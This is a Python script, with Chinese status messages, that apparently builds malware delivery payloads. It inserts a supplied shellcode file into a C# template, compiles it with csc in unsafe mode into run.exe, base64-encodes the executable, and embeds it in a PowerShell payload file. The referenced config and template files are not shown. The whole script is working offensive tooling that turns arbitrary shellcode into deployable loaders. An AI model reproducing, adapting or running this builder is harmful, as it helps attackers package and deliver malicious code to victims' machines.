import config
import os
import base64
import re

class CreateAny(object):
    def __init__(self,shellcodepath):
        self.filepath=shellcodepath
        self.create="create.cs"
        self.config={"tmpcreate":config.OUTPUTTMPCS,"tmpcreate2":config.OUTTMPEXE}
        self.command=r"{} /unsafe /platform:x86 /out:output\run.exe output\tmp.cs".format(config.CSCPATH)
        self.replacesdata()
        self.encexe()

    def replacesdata(self):
        print("[+] 检测是否有临时模板存在")
        try:
            if os.path.exists(self.config["tmpcreate"]):
                print("[!] 删除临时模板")
                os.remove(self.config["tmpcreate"])
                os.remove(self.config["tmpcreate2"])
        except:
            pass
        dk=open(self.filepath,"r",encoding="utf-8").read().replace("\n","")
        data=open(self.create,"r",encoding="utf-8").read().replace("芽衣",dk)
        print("[+] 创建临时编译模板({})".format(self.config["tmpcreate"]))
        print(data,file=open(self.config["tmpcreate"],"a",encoding="utf-8"))


    def writefile(self,path,data):
        with open(path,"w",encoding="utf-8") as wk:
            wk.write(data)

    def encexe(self):
        zx=os.popen(self.command)
        print(zx.read())
        encpe=base64.b64encode(open(config.OUTTMPEXE,"rb").read()).decode()
        self.writefile("result/base.txt",encpe)
        ps=config.ps1command.replace("雷电芽衣",encpe)
        print(ps)
        self.writefile("result/payload.ps1",ps),
        print(config.ps2command)

if __name__ == '__main__':
    obj=CreateAny(config.CSPATH)